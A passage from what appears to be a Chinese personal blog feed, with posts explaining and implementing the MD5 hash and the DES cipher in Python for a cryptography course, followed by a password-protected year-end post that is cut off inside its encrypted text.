class="string">'&lt;Q'</span>, len(message)*<span class="number">8</span>)  <span class="comment">#原消息长度64位比特的添加格式，太骚额这种写法</span></span><br><span class="line">   <span class="keyword">while</span> len(message) &gt; <span class="number">64</span>:</span><br><span class="line">       solve(message[:<span class="number">64</span>])</span><br><span class="line">       message = message[<span class="number">64</span>:]</span><br><span class="line">   <span class="comment">#长度不足64位消息自行填充</span></span><br><span class="line">   message += <span class="string">'\x80'</span></span><br><span class="line">   message += <span class="string">'\x00'</span> * (<span class="number">56</span> - len(message) % <span class="number">64</span>)</span><br><span class="line">   <span class="comment">#print type(length)</span></span><br><span class="line">   message += length</span><br><span class="line">   solve(message[:<span class="number">64</span>])</span><br></pre></td></tr></table></figure><h4 id="初始化链接变量"><a href="#初始化链接变量" class="headerlink" title="初始化链接变量"></a>初始化链接变量</h4><p>使用4个32位的寄存器A， B，C， D存放4个固定的32位整型参数，用于第一轮迭代，这里需要注意，书本上的值是直接给你的，但是没有倒过来，也就是大端和小端的转换问题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#初始向量</span></span><br><span class="line">A, B, C, D = (<span class="number">0x67452301</span>, <span class="number">0xefcdab89</span>, <span class="number">0x98badcfe</span>, <span class="number">0x10325476</span>)</span><br><span class="line"><span class="comment"># A, B, C, D = (0x01234567, 0x89ABCDEF, 0xFEDCBA98, 0x76543210)</span></span><br></pre></td></tr></table></figure><h4 id="分组处理"><a href="#分组处理" class="headerlink" title="分组处理"></a>分组处理</h4><p>与分组密码分组处理相似，有4轮步骤，将512比特的消息分组平均分为16个子分组，每个子分组有32比特，参与每一轮的的16步运算，每步输入是4个32比特的链接变量和一个32位的的消息子分组，经过这样的64步之后得到4个寄存器的值分别与输入的链接变量进行模加，关键代码如下，为了能够保存一下一开始A，B，C，D这四个初始变量的值，所以就先找四个变量把他们的值暂存一下，为最后一步的模加做准备。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">(chunk)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> A</span><br><span class="line">    <span class="keyword">global</span> B</span><br><span class="line">    <span class="keyword">global</span> C</span><br><span class="line">    <span class="keyword">global</span> D</span><br><span class="line">    w = list(struct.unpack(<span class="string">'&lt;'</span> + <span class="string">'I'</span> * <span class="number">16</span>, chunk))  <span class="comment">#分成16个组，I代表1组32位,tql,学到了</span></span><br><span class="line">    a, b, c, d = A, B, C, D</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):  <span class="comment">#64轮运算</span></span><br><span class="line">        <span class="keyword">if</span> i &lt; <span class="number">16</span>:  <span class="comment">#每一轮运算只用到了b,c,d三个</span></span><br><span class="line">            f = ( b &amp; c)|((~b) &amp; d)</span><br><span class="line">            flag  = i      <span class="comment">#用于标识处于第几组信息</span></span><br><span class="line">        <span class="keyword">elif</span> i &lt; <span class="number">32</span>:</span><br><span class="line">            f = (b &amp; d)|(c &amp; (~d))</span><br><span class="line">            flag = (<span class="number">5</span> * i +<span class="number">1</span>) %<span class="number">16</span></span><br><span class="line">        <span class="keyword">elif</span> i &lt; <span class="number">48</span>:</span><br><span class="line">            f = (b ^ c ^ d)</span><br><span class="line">            flag  = (<span class="number">3</span> * i + <span class="number">5</span>)% <span class="number">16</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            f = c ^(b |(~d))</span><br><span class="line">            flag  = (<span class="number">7</span> * i ) % <span class="number">16</span></span><br><span class="line">        tmp = b + lrot((a + f + k[i] + w[flag])&amp; <span class="number">0xffffffff</span>,r[i]) <span class="comment">#&amp;0xffffffff为了类型转换</span></span><br><span class="line">        a, b, c, d = d, tmp &amp; <span class="number">0xffffffff</span>, b, c</span><br><span class="line">        <span class="comment">#print(hex(a).replace("0x","").replace("L",""), hex(b).replace("0x","").replace("L","") , hex(c).replace("0x","").replace("L",""), hex(d).replace("0x","").replace("L",""))</span></span><br><span class="line">    A = (A + a) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    B = (B + b) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    C = (C + c) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    D = (D + d) &amp; <span class="number">0xffffffff</span></span><br></pre></td></tr></table></figure><p>这上面的代码也包含了第四步的步函数，可以单独把他们提取出来，而不同轮使用的步函数使用的非线性函数是不一样的。即四轮使用四个不同的非线性函数，其实可以发现每个非线性函数的输入不需要A寄存器里面的值，我们只需要B，C，D寄存器里面的东西，这里面得出来的结果分别放进A，C，D寄存器，所以一开始才要找另外的寄存器去存储本身的值，不然的话在转化过程中本身的变量会丢失。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f = ( b &amp; c)|((~b) &amp; d)</span><br><span class="line">f = (b &amp; d)|(c &amp; (~d))</span><br><span class="line">f = (b ^ c ^ d)</span><br><span class="line">f = c ^(b |(~d))</span><br></pre></td></tr></table></figure><p>A寄存器里面的值的运算有另外自己的一套模式，先用B，C，D向量里面做一次非线性的运算，然后将得出来的结果依次加上第一个变量，32比特的消息和一个伪随机数常数，再将结果循环左移指定的位数，并加上B的值，最后把得出来的结果放进B寄存器。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#循环左移的位移位数</span></span><br><span class="line">r = [   <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>,</span><br><span class="line">        <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>,</span><br><span class="line">         <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>,</span><br><span class="line">         <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span></span><br><span class="line">        ]</span><br><span class="line">lrot = <span class="keyword">lambda</span> x,n: (x &lt;&lt; n)|(x &gt;&gt; <span class="number">32</span>- n)</span><br><span class="line"><span class="comment">#使用正弦函数产生的位随机数，也就是书本上的T[i]</span></span><br><span class="line">k =  [int(math.floor(abs(math.sin(i + <span class="number">1</span>)) * (<span class="number">2</span> ** <span class="number">32</span>))) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>)]</span><br><span class="line">tmp = b + lrot((a + f + k[i] + w[flag])&amp; <span class="number">0xffffffff</span>,r[i])</span><br></pre></td></tr></table></figure><h3 id="正确性"><a href="#正确性" class="headerlink" title="正确性"></a>正确性</h3><p>以”helloworld”为例，分别将其在代码中运行，以及线上工具运行，检查它们的一致性。</p><p><a href="https://imgchr.com/i/F52mzn" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/02/F52mzn.png" alt="F52mzn.png"></a></p><p><a href="https://imgchr.com/i/F52AIg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/02/F52AIg.png" alt="F52AIg.png"></a></p><h3 id="详细代码-放在github上了-：MD5实现"><a href="#详细代码-放在github上了-：MD5实现" class="headerlink" title="详细代码(放在github上了)：MD5实现"></a>详细代码(放在github上了)：<a href="https://github.com/0v3rW4tch/Cryptography-course-design" target="_blank" rel="noopener">MD5实现</a></h3>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;MD5消息摘要算法一种被广泛使用的密码散列函数，输入长度小于2^64比特的消息，我的代码也是以小于2^64比特的消息为例，输出一个128位（16字节）的散列值
    
    </summary>
    
      <category term="密码学" scheme="0verwatch.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="密码学" scheme="0verwatch.top/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>DES原理及Python实现</title>
    <link href="0verwatch.top/DES-python.html"/>
    <id>0verwatch.top/DES-python.html</id>
    <published>2019-01-12T08:21:38.000Z</published>
    <updated>2019-01-12T08:22:50.813Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>DES是分组密码的一类，是一种对称密码技术，使用了Feistel的网络结构<a id="more"></a>，将明文分成多个等长模块，使用确定的算法以及对称并且相同的密钥对明密文进行加解密。</p><p><img src="https://s2.ax1x.com/2019/01/01/F5u1LF.png" alt="F5u1LF.png"></p><h3 id="算法流程"><a href="#算法流程" class="headerlink" title="算法流程"></a>算法流程</h3><ol><li>64位的明文经过初始置换而被重新排列，并将其分为左右两个分组L0和R0各32位。</li><li>在密钥的参与下，最左右两个分组进行16轮相同函数的迭代，每轮迭代都有置换和代换。注意最后一轮迭代的输出为64位。左半部分和右半部分不进行交换。</li><li>最后的预输出再通过逆初始置换产生64位的密文。</li><li>加解密过程一样，反过来即可，也就是秘钥列表得倒过来。所以得注意一下。</li></ol><h3 id="核心代码及算法分析"><a href="#核心代码及算法分析" class="headerlink" title="核心代码及算法分析"></a>核心代码及算法分析</h3><p>第一部经过分是明文经过IP置换的操作，这里可以直接用一维数组去完成，这需要注意的是数组下标不要写错，会导致数组越界，最后一部分IP逆的那一部分也一样的道理。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ip_change</span><span class="params">(bin_str)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> IP_table:</span><br><span class="line">        res += bin_str[i<span class="number">-1</span>]     <span class="comment">#数组下标i-1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment">#IP逆盒处理</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ip_re_change</span><span class="params">(bin_str)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> IP_re_table:</span><br><span class="line">        res += bin_str[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>再下来就是经过16轮迭代的过程，每一步的迭代过程里面又包含了F函数，还有密钥的产生。</p><p>首先是一个大致的迭代过程，很清楚首先产生了16轮迭代的秘钥，每一轮的迭代都有密钥参与，并且通过切片完成了每一轮的左右分组，然后右边的分组作为了新的左边，左边的分组以及右边的分组还有密钥通过F函数的计算获得新的右分组，最后一轮不做交换，这也就是我为什么只循环了15轮。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">des_encrypt_one</span><span class="params">(bin_message,bin_key)</span>:</span> <span class="comment">#64位二进制加密的测试</span></span><br><span class="line">    <span class="comment">#bin_message = deal_mess(str2bin(message))</span></span><br><span class="line">    mes_ip_bin = ip_change(bin_message)</span><br><span class="line">    <span class="comment">#bin_key = input_key_judge(str2bin(key))</span></span><br><span class="line">    key_lst = gen_key(bin_key)</span><br><span class="line">    mes_left = mes_ip_bin[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">    mes_right = mes_ip_bin[<span class="number">32</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">15</span>):</span><br><span class="line">        mes_tmp = mes_right</span><br><span class="line">        f_result = fun_f(mes_tmp,key_lst[i])</span><br><span class="line">        mes_right = str_xor(f_result,mes_left)</span><br><span class="line">        mes_left = mes_tmp</span><br><span class="line">    f_result = fun_f(mes_right,key_lst[<span class="number">15</span>])</span><br><span class="line">    mes_fin_left = str_xor(mes_left,f_result)</span><br><span class="line">    mes_fin_right = mes_right</span><br><span class="line">    fin_message = ip_re_change(mes_fin_left + mes_fin_right)</span><br><span class="line">    <span class="keyword">return</span> fin_message</span><br></pre></td></tr></table></figure><p>再看看产生密钥的关键代码gen_key，传进去的参数密钥实际是64位的，但实际发挥作用的是56位，是因为仅过了一次PC-1的置换，这也解释了这段代码为什么到后面切片的时候以28为中心分左右。然后根据是第几轮然后对左右分组的密钥进行循环左移，出来的56位再经过一次置换生成48位的密钥，最后用数组将所有密钥都装好。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_key</span><span class="params">(key)</span>:</span></span><br><span class="line">    key_list = []</span><br><span class="line">    divide_output = change_key1(key)</span><br><span class="line">    key_C0 = divide_output[<span class="number">0</span>:<span class="number">28</span>]</span><br><span class="line">    key_D0 = divide_output[<span class="number">28</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> SHIFT:</span><br><span class="line">        key_c = left_turn(key_C0,i)</span><br><span class="line">        key_d = left_turn(key_D0,i)</span><br><span class="line">        key_output = change_key2(key_c + key_d)</span><br><span class="line">        key_list.append(key_output)</span><br><span class="line">    <span class="keyword">return</span> key_list</span><br></pre></td></tr></table></figure><p>PC-1，PC-2的置换过程，跟IP置换差不多，都是利用了打表然后字符串拼接的方式实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#秘钥的PC-1置换</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_key1</span><span class="params">(my_key)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> PC_1:</span><br><span class="line">        res += my_key[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment">#秘钥的PC-2置换</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_key2</span><span class="params">(my_key)</span>:</span></span><br><span class="line">    res  = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> PC_2:</span><br><span class="line">        res += my_key[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>重点还有F函数的处理，也即是代码里面的fun_f，这里面主要有四个步骤，分别是扩展置换，密钥加，经过S盒的代换，最后经过了P盒的置换，最终把32位的输入变成48位的输出。E盒以及P盒的置换也是很简单打好表然后用字符串拼接就好。关键是S盒的变换原理，6位的输入4位的输出，输入前两位作为S盒横坐标，中间4位作为列，但是我这里是以bin输出得注意位数不够四位得补齐</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># F函数的实现</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun_f</span><span class="params">(bin_str,key)</span>:</span></span><br><span class="line">    first_output = e_key(bin_str)</span><br><span class="line">    second_output = str_xor(first_output,key)</span><br><span class="line">    third_output = s_box(second_output)</span><br><span class="line">    last_output = p_box(third_output)</span><br><span class="line">    <span class="keyword">return</span> last_output</span><br><span class="line"></span><br><span class="line"><span class="comment">#E盒置换</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">e_key</span><span class="params">(bin_str)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> E:</span><br><span class="line">        res += bin_str[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># S盒过程</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">s_box</span><span class="params">(my_str)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    c = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(my_str),<span class="number">6</span>):</span><br><span class="line">        now_str = my_str[i:i+<span class="number">6</span>]</span><br><span class="line">        row = int(now_str[<span class="number">0</span>]+now_str[<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">        col = int(now_str[<span class="number">1</span>:<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">        num = bin(S[c][row*<span class="number">16</span> + col])[<span class="number">2</span>:]   <span class="comment">#利用了bin输出有可能不是4位str类型的值，所以才有下面的循环并且加上字符0</span></span><br><span class="line">        <span class="keyword">for</span> gz <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>-len(num)):</span><br><span class="line">            num = <span class="string">'0'</span>+ num</span><br><span class="line">        res += num</span><br><span class="line">        c  += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment">#P盒置换</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p_box</span><span class="params">(bin_str)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span>  P:</span><br><span class="line">        res += bin_str[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="正确性"><a href="#正确性" class="headerlink" title="正确性"></a>正确性</h3><p>加密解密内容都会放到文件里面，然后通过读写文件的方式将内容成功加解密，以”helloworld”为例，能够正确加解密</p><p><img src="https://s2.ax1x.com/2019/01/01/F51J8s.png" alt="F51J8s.png"></p><h3 id="详细代码-放在github上了-：DES加解密"><a href="#详细代码-放在github上了-：DES加解密" class="headerlink" title="详细代码(放在github上了)：DES加解密"></a>详细代码(放在github上了)：<a href="https://github.com/0v3rW4tch/Cryptography-course-design" target="_blank" rel="noopener">DES加解密</a></h3>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;DES是分组密码的一类，是一种对称密码技术，使用了Feistel的网络结构
    
    </summary>
    
      <category term="密码学" scheme="0verwatch.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="密码学" scheme="0verwatch.top/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>2018嘅總結</title>
    <link href="0verwatch.top/writing-2.html"/>
    <id>0verwatch.top/writing-2.html</id>
    <published>2018-12-30T03:31:45.000Z</published>
    <updated>2018-12-30T07:25:25.752Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">请输入密码</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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